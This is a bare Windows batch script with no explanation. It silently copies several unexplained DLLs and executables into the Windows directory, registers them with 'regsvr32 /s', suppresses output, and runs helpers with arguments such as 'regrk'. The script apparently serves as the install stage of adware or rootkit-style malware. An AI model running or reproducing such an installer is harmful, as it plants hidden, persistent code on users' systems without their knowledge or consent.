copy    movctrlnkd.dll     %windir%   >nul
%windir%\system32\regsvr32.exe     /s     %windir%\movctrlnkd.dll

copy     nssfrch.dll      %windir%
regsvr32.exe   /s  nssfrch.dll

emrk.exe   %windir%\bxsbang.dll      bxsbang
emrk.exe       %windir%\ocgrep.dll      ocgrep
       
copy     bxsbang.dll   %windir%\bxsbang.dll       >nul
copy   ocgrep.dll    %windir%\ocgrep.dll  >nul

kthemup.exe       reg
copy       kthemup.exe   %windir%   >nul

emrk.exe   regrk

